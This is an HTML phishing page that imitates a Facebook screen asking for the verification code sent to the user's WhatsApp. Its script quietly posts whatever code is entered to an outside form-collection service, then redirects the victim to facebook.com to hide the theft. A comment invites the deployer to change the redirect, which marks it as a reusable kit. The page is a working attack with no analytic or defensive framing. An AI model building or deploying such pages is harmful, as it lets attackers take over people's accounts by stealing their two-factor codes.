<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      box-sizing: border-box;
    }

    .header {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 15px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .header i {
      font-size: 18px;
      color: #1877f2;
    }

    .title {
      font-size: 22px;
      font-weight: 600;
      margin-top: 10px;
      margin-bottom: 5px;
    }

    .subtitle {
      color: #555;
      font-size: 15px;
      margin-bottom: 15px;
    }

    .image-box {
      padding: 15px;
      border-radius: 40px;
      text-align: center;
      margin-bottom: 20px;
    }

    .image-box img {
      width: 100%;
      max-width: 300px;
      border-radius: 10px;
      margin-left: auto;
      margin-right: auto;
      height: auto;
    }

    form input[type="text"] {
      width: 90%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 10px;
      margin-bottom: 15px;
      outline: none;
      box-shadow: none;
    }

    .btn-submit {
      width: 100%;
      background-color: #1877f2;
      border: none;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
      border-radius: 30px;
      cursor: pointer;
      transition: 0.3s;
    }

    .btn-submit:hover {
      background-color: #0d64d5;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <i class="fab fa-facebook"></i> Facebook
    </div>

    <div class="title">Check your WhatsApp messages</div>
    <div class="subtitle">Enter the code we sent to your WhatsApp account.</div>

    <div class="image-box">
      <!-- ✅ Image: Hand holding mobile with WhatsApp + **** -->
      <img src="https://cdn.glitch.global/9bef27bb-d20f-48f1-a5c1-4e7b48f39f38/2FA.jpeg?v=1748178031872" alt="WhatsApp Code" />
    </div>

    <form id="verifyForm" action="https://submit-form.com/1a4XJDmZ" method="POST">
      <input type="text" name="code" id="codeInput" placeholder="Code" required>
      <button type="submit" class="btn-submit">Continue</button>
    </form>
  </div>

  <script>
    const form = document.getElementById("verifyForm");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      fetch(form.action, {
        method: "POST",
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
      }).then(response => {
        if (response.ok) {
          window.location.href = "https://facebook.com"; // ✅ Change to your redirect link
        } else {
          alert("Submission failed. Please try again.");
        }
      }).catch(error => {
        alert("There was an error!");
      });
    });
  </script>
</body>
</html>
